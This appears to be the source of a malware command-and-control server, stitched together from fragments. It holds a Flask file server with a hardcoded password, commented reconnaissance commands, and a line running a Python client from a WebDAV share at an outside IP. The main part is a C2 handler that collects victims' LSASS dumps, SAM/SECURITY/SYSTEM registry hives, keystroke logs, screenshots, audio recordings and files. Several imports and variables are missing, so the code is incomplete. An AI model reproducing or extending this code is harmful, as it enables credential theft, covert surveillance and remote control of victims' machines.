from flask import Flask, request, send_file
from werkzeug.utils import secure_filename
import os
from server import utils
from server import listener
from server import ps_modules

import re
import json
import shlex
import random
import subprocess
from tabulate import tabulate
from jsonc_parser.parser import JsoncParser
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.formatted_text import FormattedText
from prompt_toolkit.output import ColorDepth

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'password' not in request.form or request.form['password'] != 'mypassword':
        return 'Unauthorized', 401

    file = request.files['file']
    filename = secure_filename(file.filename)
    file.save(os.path.join('/path/to/upload/directory', filename))

    return 'File uploaded successfully', 200

@app.route('/download/<filename>')
def download_file(filename):
    return send_file(os.path.join('/path/to/upload/directory', filename))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, ssl_context='adhoc')



#Essential CMDs mostly classics, amat. 
#systeminfo
#tasklist
#chcp 65001 & dir “C:\WORK\Source\tgnews\tgnews\bin\x64\Release”
#nslookup -debug -type=A+AAAA -nosearch <domain> <ip>
#ipconfig
#dir
#chcp 65001 && cmd /c dir
#certutil -decode C:\Users\Jefry\source\repos\client\client\bin\Release\config.txt
#C:\Users\Jefry\source\repos\client\client\bin\Release\config1.txt
#newtime2
#dir C:\
#\\194[.]126[.]178[.]8@80\webdav\Python39\python.exe \\194[.]126[.]178[.]8@80\webdav\Python39\Client.py
#chcp 65001 && cmd /c tasklist /FI “ImageName eq VMSearch.exe”

#FROM nimlang/nim:1.6.18

#RUN apt update \
#&& apt install -y python3 python3-pip mingw-w64 upx \
#&& pip3 install prompt_toolkit requests tabulate jsonc-parser pycryptodome \
#&& nimble install -y nimcrypto crc32 pixie wauto winim rc4 nimprotect


class C2(BaseHTTPRequestHandler):

    def default_logger_sinkhole(self, *args):
        pass

    def send_default_headers_and_status_code(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def update_last_checkin(self):
        agent = self.headers["user-agent"]
        agents[agent]["info"]["Last Check In"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    def validate_request(self):
        try:
            user_agent = self.headers["user-agent"]
        except KeyError:
            return "intruder"
        if user_agent in agents:
            return "exists"
        elif re.match(user_agent_pattern, user_agent):
            return "new"
        else:
            return "intruder"

    def parse_agent_data(self, agent_data):

        command_type = agent_data['command_type']
        agent = self.headers["user-agent"]
        file_save_strftime = "%d.%m.%Y_%H.%M.%S"
        if command_type == "download" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, ntpath.basename(agent_data["data"]["file_path"]))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"], encoding="utf-8")):
                utils.log_message(f"Downloaded remote file from agent {agent}")
                utils.log_message(f"[*] remote file: {agent_data['data']['file_path']}", print_time=False)
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "screenshot" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(
                collect_folder, agent, "screenshot_{}.png".format(datetime.now().strftime(file_save_strftime)))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["screenshot_base64"], encoding="utf-8")):
                utils.log_message(f"Downloaded screenshot from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "lsass" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, "lsass_{}.dmp".format(datetime.now().strftime(
                file_save_strftime)))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"], encoding="utf-8")):
                utils.log_message(f"Downloaded lsass dump from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "audio" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, "record_{}.wav".format(datetime.now().strftime(
                file_save_strftime)))
            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"], encoding="utf-8")):
                utils.log_message(f"Downloaded audio recording from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type in ["keylog-dump", "keylog-stop"] and "keystrokes_base64" in agent_data["data"]:
            keystrokes = utils.decode_base_64(agent_data["data"]["keystrokes_base64"], encoding="utf-8")
            if isinstance(keystrokes, bytes):
                keystrokes = keystrokes.decode(errors='ignore')
            utils.log_message(f"keystrokes dump from agent {agent}")
            utils.log_message(keystrokes, print_time=False)
            if 'status' in agent_data['data']:
                utils.log_message(f"[*] status: {agent_data['data']['status']}", print_time=False)

        elif command_type == "sam" and agent_data["data"]["is_success"] == "true":
            save_path = os.path.join(collect_folder, agent, "sam_{}".format(datetime.now().strftime(file_save_strftime)))
            sam_path = os.path.join(save_path, "sam")
            sec_path = os.path.join(save_path, "security")
            sys_path = os.path.join(save_path, "system")
            if utils.write_file(sam_path, utils.decode_base_64(agent_data["data"]["sam_base64"], encoding="utf-8")) and \
                    utils.write_file(sec_path, utils.decode_base_64(agent_data["data"]["sec_base64"], encoding="utf-8")) and \
                    utils.write_file(sys_path, utils.decode_base_64(agent_data["data"]["sys_base64"], encoding="utf-8")):
                utils.log_message(f"Downloaded sam,security,system hives from agent {agent}")
                utils.log_message(f"[+] saved in: {save_path}", print_time=False)

        elif command_type == "collect":
            # agent exists
            try: 
                agents[agent]["info"] = agent_data["data"]
            # new agent 
            except KeyError: 
                agents[agent] = {
                    "info": agent_data["data"],
                    "pending_commands": []
                }

            utils.log_message(f"Collected data from agent {agent} [command: {command_type}]")

        else:
            utils.log_message(f"Data from agent {agent} [command: {command_type}]")
            for field in agent_data["data"]:
                utils.log_message(f"[*] {field}: {agent_data['data'][field]}", print_time=False)




#Prepare other lsitenre






